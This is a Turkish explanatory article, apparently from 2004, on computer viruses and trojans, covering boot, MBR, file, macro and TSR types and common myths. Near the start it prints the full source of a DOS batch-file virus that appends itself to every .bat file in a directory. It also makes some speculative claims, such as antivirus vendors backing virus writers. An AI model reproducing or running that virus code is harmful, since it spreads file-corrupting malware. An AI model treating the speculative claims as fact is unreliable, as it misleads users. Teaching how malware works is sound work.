# Virüsler Hakkinda Herşey

## **Virusler Hakkında Herşey******

**V****irüs nedir diye ****konumuza **başlıyorum sevgili bilgisayar kulanıcıları virüsler bilgisayar ortamlarına kaçak olarak giren küçük programlardırsisteme girdiklerinde** coğalırlar ve tüm sistemi ele geçirirler virüsler kimilerine göre canlıdır çünkü yapay zekaları oldukları ve üreme iç güdüleri**** oldugundan canlı oldukları düşünülür****
****tabi bu tartışılır biz Kaos Team olarak bu yazıda bahsedecegiz virüslerden nasıl korunuruz veya nasıl kurtuluruz.konuya girmeden önce virüsler hakında bilgi edinelim böylece bulaşma yolarınıda ****
****ögrenebiliriz.****

****herhangi bir yazılımın virüs olabilmesi için en az şu kriterleri saglaması gerklidir:****
****1.çalıştırılabilir olmalı****
****2.kendi kendilerine cogalması****
****3.diger çalışabilir opjeleri kendi kolanisine çevirebilmesi******

**Bir bilgisayar virüsü yazamk çok kolaydır aşagıda verdigimiz virüsün ****
****kaynak kodudu (batch file virüs)nün kaynak kodudur bu yazılım ms-dos işletim sisteminin bacth file yazılmıştır****
****bu bir virüs yazılımıdır yalnızca virüslerin komutlarından oluşan bir yazılımı oldugunu göstermek amacıyla verilmiştir ****
****lütfen şaka amaçlada olsa bu yazılımı kimseye uygulamayınız zaten her virüs koruma programı****
****tanıya bilmekte eski bir virüs yazılımıdır. ****

****KAOS TEAM (BFV) KAYNAK KODU****

```bash
echo The Batch Filr Virus (BFT.BAT)
echo Osborne/McGraw-Hill ``Computer Virıs Handbook`` kitabından
echo -Bu purogram, bilgisayar virislerinin nasıl çalıştıklarını ve
echo bir bilgisayar virisinün ne kadar kolay oldugunu
echo gostermektedir.
echo -Bulunulan dizin:
cd
echo -
echo UYARI! BU PROGRAM, BULUNULAN DİZİNDEKİ BÜTÜN .BAT DOSYALARINA
echo BULAŞIR. BULAŞTIGI .BAT DOSYALARI DİGER .BAT DOSYALARINI DA 
echo ETKİLER! BU PROGRAMI ÇALIŞTIRMAKLA BÜTÜN .BAT DOSYALARINIZI
echo BOZABİLİRSİNİZ!
echo -
echo Lütfen bu programı çalıştırmadan önce bütün .BAT dosyalarınızı
echoyedekleyiniz. Eger nasıl yedekleme yapılacagını bilmiyorsanız
echo bu programı çalıştırmayın.
echo -
echo Yukardaki açıklamaları anladıysanız devam etmek için 
echo herhangi bir tuşa; programdan çıkmak için ^C tuşlarına basınız.
pause > nul
cls
echo Bulunulan dizin
cd
echo Dizindeki bütün .BAT dosyalarına bulaşıyorum...
ctty nul
for % %f in (*.bat) do copy % % f + bfv.bat
ctty con
cls
echo Bu dizindeki bütün .BAT dosyalarına Batch File Virüsü
echo bulaşmıştır. Bu virüsü temizlemek için yedeklediginiz .BAT
echo dosyalarını yerlerine kopyalayınız.
```

****Şimdi virüs çeşitlerini sıralıyacaz****

****Kullandıkları teknikler çok çeşitli olsa da, virüsler pratikte kabaca Dosya ve Boot virüsleri olarak ikiye ayrılırlar. Virüs deyince genelde akla ilk gelen dosya virüsleridir. Ama sık rastlanan birçok virüsün boot virüsü olduğunu da hatırlatmakta fayda var. Bir Cansu'yu, Crazy Boot'u, eskilerden Ping-Pong'u kim unutabilir ki? ****
****Boot Virüsleri. Disketlerin ve sabit disklerin boot sektörlerine yerleşirler. Bilgisayar açıldığında veya sıfırlandığında ('reset'lendiğinde) disketin veya sabit diskin boot sektöründeki yükleyici program otomatik olarak çalıştırılır. Daha sonra işletim sistemi yüklenir ve bilgisayar normal kullanıma başlanır. Boot virüsleri, boot sektöründeki yükleme programında değişiklik yaparak kendilerini otomatikman çalıştırırlar. Böylece aktif hale gelirler ve bilgisayar kapatılana kadar bulaşmaya devam ederler. ****

****Dosya Virüsleri. Dosya virüsleri genelde virüs deyince akla gelen virüs türüdür. Bunlar birer asalak gibi kendilerini programın sonuna eklerler. Programın başında da değişiklik yaparak, program çalıştırıldığında ilk önce kendileri çalışırlar. RAM belleğe bir TSR gibi yerleşirler ve bilgisayar kapatılana kadar bulaşmaya devam ederler. Genelde EXE ve COM'lara bulaşırlar. Bazılarının SYS, OVL ve BIN gibi program kodu dosyalarına bulaştığı da görülmüştür. Çoğu yalnızca çalıştırılan program dosyalarına bulaşmakla birlikte, Yandan Çarklı virüsü gibi olanları çalıştırılmayanlara da bulaşırlar. ****

****Virüsümsüler. Virüslere benzeyen fakat virüs olmayan birçok program türü vardır. Bunların ortak özelliği bilgimiz dışında çalışmalarıdır. Örneğin bombalar; bir program yazılırken içine konur. Belli bir zamanda veya bazı şartların oluşmasına bakarak bilgisayar sistemine zarar verirler. Bombaların benzeri truva atlarıdır. Bunlar da programlara yerleştirilirler ve belli koşullar gerçekleştiğinde veya bir koşula bağlı olmaksızın daha ilk çalıştırılmada zarar verirler. Truva atları daha yaygın programlara yerleştirilirler. Ne bombalar ne de truva atları bulaşamazlar. Bu yüzden virüs değillerdir. Diğer "virüsümsüler", networklerde kullanıcı şifrelerini öğrenmek için kullanılırlar. Öğrendikleri şifreleri sahiplerine bildirirler. Bunlara bukalemun adı verilir. ****
****turuva atı (trojan)****

****Özellikle güvenliği sadece kullananın becerisine kalmış kişisel****
****bilgisayarlara karşı kullanılan ve uzaktan erişim olanağı sağlayan ****
****programlardır Trojanlar. Netbus ve sonrasında türeyen birçok trojan ****
****programının kendine has birçok özelliği var. Tam anlamıyla çalıştırılan ****
****makineyi kontrol altına alabilen trojanlardan işlevleri daha az olanlarına ****
****kadar şu an İnternet üzerinde dolaşan birçok program var. Bunların en meşhuru ****
****: Subseven 2.1. Artık neredeyse kendi başına bir yazılım sektörü oluşan ****
****trojanların kendilerine göre versiyon ve güncellemeleri bile var. ****
****Öyle ki McAffee Network Associates firması,****
****Subseven için "yüksek risklidir" demecini veriyor. ****
****Aslında kısa sürede gelişen virüs ve trojan piyasasına ****
****kimi virüs programı üreticilerinin içten içe destek verdiği paranoyasındayız. ****
****Düşünsenize camcı, cam kırılmazsa iş yapamaz eğer onun camları indiren bir afacan oğlu yoksa.******

**Virüs nedir ? Trojan (Truva ati) nedir ?******

**Virüsler, kendi kodlarini baska programlara veya program niteligi olan dosyalara bulastirabilme özelligi olan (kendi kodunu kopyalayabilen) bilgisayar programlaridir.Bulastiklari bilgisayarda genelde hizli bir sekilde yayilirlar.Belli bir amaca yönelik olarak yazilmis, zarar vermeye yönelik olabilecekleri gibi eglence amaciyla da yazilmis olabilirler.******

**Truva atlari, virüslerden oldukça farkli bir yapiya sahiptir.Asla baska programlara bulasmazlar.Belli olaylara bagli olarak tetiklenen bir rutindirler.Kendilerini kopyalayamadiklari için bazi programlarin içine bilinçli olarak yerlestirilirler.Trojanlar, ilgi çeken, utility gibi programlarin içine yerlestirilirler.Trojan kodu, trojanin içine gizlendigi programin yazari tarafindan yazilmis olabilecegi gibi sonradan da programa eklenmis olabilir.Trojanlar aslinda kopya koruma amaciyla hazirlanirlar.******

**Virüsler çogunlukla Assembly gibi düsük seviyeli bir programlama dili ile yazilirlar.Bunun asil 2 sebebi vardir.******

**1- Assembly'in çok güçlü bir dil olmasi:****
****2- Yazilan programlarin derlendikten sonraki dosya boylarinin çok küçük olmasi******

**Bu özelliklerin her ikisi de virüs yazarlarinin assembly dilini kullanmasi için yeterli ve gerekli sebeplerdir.******

**Virüsleri özelliklerine göre siniflandirmak pek mümkün olmasa da asagidaki sekildeki gibi bir siniflandirma yapmak yanlis olmayacaktir.Ancak pek çok virüs, pek çok özelligi bünyesinde barindirabilir.Bulasma hizini arttirabilmek amaciyla yapilan bu durum sonucu virüs, boot sektörlere, mbr kayitlarina, programlara bulasabilir. Simdi de bu virüs türlerinin isleyislerine bakalim******

**1 - Disk virüsleri : a- Boot b- MBR ****
****2 - Dosya virüsleri : a- Program (TSR ve nonTSR) b- Makro virüsleri****
****3- FlashBIOS virüsleri******

**1 - DiSK ViRÜSLERI******

**Disk virüsleri, adindan da anlasilacagi üzere, disk ve/veya disketler üzerinde isletim sistemi için özel anlami olan bölgelere (boot sektör, MBR) yerlesen virüslerdir. Disk virüsleri, hakkinda en çok yanlis bilginin oldugu virüs türüdür.Boot ve MBR virüsleri, asagida da göreceginiz gibi isletim sisteminden önce hafizaya yüklenir.Bu yüzden isletim sistemini kolaylikla atlatip, Yukaridaki sekilde de görülecegi gibi disk virüslerini boot ve MBR (partition) virüsleri olarak 2 gruba ayirabiliriz.******

**BOOT Virüsleri******

**Boot virüslerinin ne olduguna geçmeden önce boot sektör nedir, disk üzerinde nerede bulunur, önce bunlara bir bakalim; Boot sektör, bir diskin veya disketin isletim sistemini yüklemeye yarayan 1 sektör (512 byte) uzunlugundaki bir programdir.Boot sektörler, disketlerde 0.ci iz, 0.ci kafa,1.ci sektör üzerinde bulunur. Hard disklerde ise boot sektörü 0.ci iz, 1.ci kafa ve 1.ci sektör üzerinde bulunur.Boot sektör, açilis için gerekli sistem dosyalarinin yükleyen programdir.Ayni zamanda disk (veya disket) ile ilgili bilgileri saklar.DOS buradaki bilgileri kullanarak cylider hesaplarini yapar.******

**Nornal kosullarda, bilgisayari baslatabilecek durumdaki bir sistem disketini (virüssüz) sürücüye takip bilgisayari açtigimizda, bilgisayar ilk olarak disket sürücüye bakar.Eger sürücüde bir disket var ise bu disketin boot sektörü hafizanin 0000:7C00 (hex) adresine okunur ve okunan boot sektör çalistirilir.Boot sektör, isletim sistemini yükleyerek denetimi isletim sistemine birakir.Eger bilgisayari boot edecek disket bir boot virüsü içeriyorsa o zaman durum degisir.Bilgisayar, boot sektörü yine 0000:7C00 adresine okur ve akisi bu adrese yönlendirir.Disketten okunan boot kaydi, yapi olarak degistiginden dolayi, 0000:7C00'daki kod virüsü hafiza içine yükleyip, hafizadaki konumunu garanti altina alacaktir.Virüs aktivitesi için gerekli interrupt servislerini de kontrol altina aldiktan sonra orjinal boot kayidini okuyarak isletim sisteminin yüklenmesini saglayacaktir.******

**MBR (Partition) Virüsleri******

**MBR virüsleri esas olarak, boot virüslerinden pek de farkli degildir.Ancak can alici bir nokta vardir ki, bu boot ve mbr virüsleri arasindaki en önemli noktadir. Hard diskler kapasite olarak çok farkli ve büyük kapasitede olduklarindan diskin DOS'a tanitilmasi amaciyla MBR - Master Boot Record (Ana açilis kaydi) denilen özel bir açilis programi içerirler.Bu kod diskin 0.ci iz, 0.ci kafa ve 1.ci sektörü üzerinde bulunur.Yani disketlerde boot sektörün bulundugu konum, hard diskler için MBR yeridir.Master boot record, hangi disk partitionundan bilgisayarin açilacagini gösterir.Bu yüzden çok önemlidir.Eger bilgisayar hard diskten boot ediliyorsa, o takdirde mbr ve partition table okunur.Aktif partitiona ait boot sektör okunur.Bundan sonrasi boot sektör kismindaki sistemin aynisidir.******

**2 - DOSYA ViRÜSLERi******

**Dosya virüsleri açikça anlasilacagi gibi hedefi dosyalar olan virüslerdir.Dosya virüsleri çogunlukla COM, EXE, SYS olmak üzere OVL, OVR, DOC, XLS, DXF gibi degisik tipte kütüklere bulasabilirler.******

**Makro virüsleri******

**Makro virüsleri Word, Excel gibi programlarin makro dilleri ile (mesela VBA - Visual Basic for Applications) yazilirlar.Aktif olmalari bazi uygulamalara (word, excel vs) bagli oldugundan program virüslerine oranla çok daha az etkilidirler.******

**Program virüsleri******

**(Not : Program virüsleri ile ilgili açiklamalar ileride detayli olarak anlatilacaktir).******

**Program virüsleri, DOS'un çalistirilabilir dosya uzantilari olan COM ve EXE türü programlar basta olmak üzere SYS, OVL, DLL gibi degisik sürücü ve kütüphane dosyalarini kendilerine kurban olarak seçip bu dosyalara bulasabilirler.Dosya virüsleri bellekte sürekli kalmayan (nonTSR) ve bellekte yerlesik duran (TSR) olarak 2 tipte yazilirlar.******

**nonTSR (Bellekte sürekli kalmayan) virüsler******

**Bellekte sürekli olarak kalmazlar.Kodlari oldukça basittir.Bellekte sürekli kalmayan virüsler sadece virüslü bir program çalistirildiginda baska programlara bulasabilirler.Virüslü program çalistirildiginda programin basinda program kontrolünü virüs koduna yönlendirecek bir takim komutlar bulunur.Virüs kontrolü bu sekilde ele aldiktan sonra virüs kendisine temiz olarak nitelendirilen virüssüz programlar aramaya koyulur.Buldugu temiz programlarin sonuna kendi kodunu ekler ve programin basina da virüsün kontrolü ele alabilmesi için özel bir atlama komutu yerlestirir ve kendisine yeni kurban programlar arar.Virüs bulasma isini bitirdikten sonra çalistirmak istedigimiz program ile ilgili tüm ayarlari düzenleyerek kontrolü konak programa devreder.******

**TSR (Bellekte sürekli kalan) virüsler******

**TSR virüsler yapi olarak TSR olmayan virüslerden çok farklidir.TSR virüsler, 2 temel bölümden olusurlar.1.ci bölüm; Virüsün çalismasi için gerekli ayarlamalari yapar ve TSR olacak kodu aktiflestirir.2.bölüm TSR olan kodun kendisidir ve TSR virüslerin hayati önemdeki bölümüdür.Bu tip virüsler, çalismak için sadece TSR olmakla kalmazlar.Ayni zamanda çesitli Interruptlari (kesilmeleri) kontrol altina alirlar.Böylece DOS üzerinden yapilan islemleri bile kontrol altina alabilirler.Örnek vermek gerekirse; TSR bir virüs DIR, COPY gibi DOS komutlari ile yapilan -daha dogrusu yapilmak istenen- islemleri kontrol altina alabilir.Kullanici DIR komutunu kullandiginda dosya boylarinin 0 olarak gösterilmesi, dosya boylarinin eksik gösterilmesi gibi islemler TSR bir virüs için çok kolaydir.******

**3 - FlashBIOS Virüsleri******

**FlashBIOS virüsleri tekrar yazilabilir özellikteki BIOS chiplerine bulasirlar.******

**ViRÜSLER NELERi YAPABiLiR, NELERi YAPAMAZ ?******

**Virüslerin neleri yapip neleri yapamayacaklari konusu en çok ilgi çeken, üzerinde en çok konusulan konulardan birisidir. Çünkü bir virüs, yaptiklariyla anilir ve bilinir.Virüserin en çok korkulan etkilerin basinda gelenler sunlardir:******

**BIR VIRÜS BILGISAYARDAN SILINDIKTEN SONRA KENDI KENDINE TEKRAR ORTAYA ÇIKIP ETKINLESEBILIR MI ?******

**Hayir.Bir virüsün temizlenmesinden sonra durduk yerde yeniden peydahlanmasi dogru degildir.Eger bir antivirüs programi ile sisteminizden virüsü temizlemenize ragmen virüs tekrar ortaya çikiyorsa 2.durum sözkonusu olabilir.******

**1- Antivirüs, virüsü temizleyemiyor olabilir.Amatör programcilarin yazdiklari shareware olarak dagitilan antivirüs programlarindan birini kullaniyorsaniz bu durumla karsilasmaniz olasidir.Bunun pek çok sebebi olabilir.Örnegin antivirüs, virüsü baska bir virüsle karistiriyor olabilir.Imza tarama esasina göre çalisan antivirüslerde ortaya çikabilecek bu sorun genellikle iki virüsün birbirinin varyanti (üzerinde küçük degisiklikler yapilmis biçim) olmasindan kaynaklanir.Bir veya birkaç virüsü temizlemek için hazirlanmis eski antivirüs programlarinin o virüsün yeni bir varyantinin temizlenmesi amaci ile kullanilmasi sonucu da ortaya çikabilir.Mesela; elimizde bir programcinin 4 yil önce yazdigi xx virüsünün antivirüs programi olsun.1 yil önce ortaya çikan xx virüsünün bir varyanti olan xx.a gibi bir virüsü temizlemek istersek muhtemelen tarama imzalari ayni veya benzer yapida olacagindan bu tür bir sorun ile karsilasabiliriz.Bunun sonucu olarak virüs uzunlugunun farkli olusundan dolayi yanlis isimle bile olsa tespit edilir ancak temizlenemez.Bu durumda antivirüs kullaniciyi yeni bir virüsle karsilastigini belirten bir mesaj ile uyarir.******

**2- Bir yerlerde temizlemeyi unuttugunuz birkaç virüslü dosyaniz kalmistir.Virüs taramalarinda taramayi unuttugunuz disketleri kullanirsaniz ve disketteki programlar virüslü ise siz farkina varmadan virüs tekrar sisteminize bulasacaktir.Virüs taramasi yaparken sahip oldugunuz tüm disk ve disketleri virüs taramasindan geçirin.Ancak bu sekilde virüslerden kurtulabilirsiniz.******

**Burada belirtmek isterim ki, bu iki durumdan 2.sinin olmasi daha muhtemeldir.Birinci durumun gerçeklesme ihtimali çok azdir.******

**VIRÜSLER VERI DOSYALARINA ZARAR VEREBILIR MI ?******

**Evet, kesinlikle verebilir.Özel bir veya birkaç dosya türünü hedef alan virüsler, bu tür dosyalara silebilir veya içlerindeki veriyi degistirebilir, dosyanin yapisini bozabilir.Örnegin yerli virüslerden Trakia.653 virüsü AutoCAD'in DXF ve DWG uzantili dosyalari hedef almakta ve bu kütüklerin yapisini bozarak islenemeyecek hale getirmektedir.Trakia.560 virüsü bazi dosyalari silmektedir.Ancak bu tür etkiler virüsün farkedilmesi kolaylastiracagindan pek tercih edilmezler.******

**ViRÜSLER YAZMA-KORUMALI DiSKETLERE BULASABiLiR Mi ?******

**Disketlerin yazma korumasi yazilimla kontrol edilen bir sistemdir ve bu sistem asilabilir.Ancak yazma korumasini kapatmak virüs içinde ekstra kod anlamina gelir.Eksta kod, virüsün boyunu uzatacak ve virüsün farkedilmesini kolaylastiracaktir.Bu yüzden uygulanan bir yol degildir.Virüsler, yazma korumasini kapatmak yerine yazma korumasini kontrol edip koruma varsa bulasmamayi tercih ederler.******

**VIRÜSLER CMOS'A BULASABILIR MI ?******

**Herhangi bir virüsün CMOS alanina bulasmasi mümkün degildir.Hatta imkansizdir.CMOS bellek kapasitesi üretici firmaya bagli olarak 128 veya 256 bayttir.Bu alan virüsün ihtiyaç duyacagi bellegin çok altindadir.Kaldi ki CMOS, setup parametrelerinin saklandigi bir veri alanidir.Ancak virüsler setup parametlerini degistirebilirler.******

**VIRÜSLER DONANIMA ZARAR VEREBILIR MI ?******

**Eskiden kismen, günümüzde hayir.Eski MDA (mochrome display adapter - tekrenkli görüntü bagdastiricisi) ekran kartlarina bir komut serisi yollanarak MDA kartlar yakilabilir.Ancak MDA kartlar çoktan tarih oldugundan artik bunun pek önemi de yok.******

**Eski disklerin okuma/yazma kafalarinin ani hareketlerle hareket ettirilmesi sonucu diskin bozulmasini saglamak mümkündü. Artik günümüzde ise disklerin cacheleri sayesinde bu tür hareketler disk tarafindan engellenebiliyor ve disklerdeki kafalar manyetik bir esasa göre çalisiyor.Bu sayede elektrikler kesilse bile disk zarar görmeden kafalar park ediliyor.******

**Bir de disk üzerinde bir bölgenin milyonlarca kez formatlanmasi durumu var.Bu islem sonunda disk üzerindeki manyetik malzeme zarar görecek, disk okunamaz duruma gelecektir.Bu islemin partition table üzerinde yapildigini düsünürsek diski kaldirip çöpe atmaktan veya disk kasasini açip raf süsü olarak kullanmak disinda geriye pek bir sey kalmaz.Ancak hemen belirteyim ki bu formatlama islemi oldukça uzun sürecektir.Bir virüsü diski milyonlarca kez formatlamak isterse, kullanici bilgisayarin kilitlendigini düsünecek ve resetleyecektir.Sonuçta virüs amacina ulasamamis olacaktir.******

**Eger Windows95/98/NT gibi bir isletim sisteminin çalistigi bilgisayarlarda windows direkt disk erisimlerini mümkün oldugunca engellemeye çalisir.******

**VIRÜSLER V-SAFE, VIRSCAN, GUARD GIBI KORUMA PROGRAMLARINI ATLATABILIR MI ?******

| **Yeni bir virüs veya çok iyi yazilmis bir virüs bu tür programlari safdisi edebilir.Ancak koruma programlari virüslü programi daha çalismadan önce test ettiklerinden bu düsük bir ihtimaldir.Virüsler, bu tür programlari aktivitelerinin rapor edilmesinin engellemek için atlatmak ister.****** |
| --- |

---
*Kaynak: `VİRÜSLER HAKKINDA HERŞEY/VİRÜSLER HAKKINDA HERŞEY.doc` — tt — 2004*
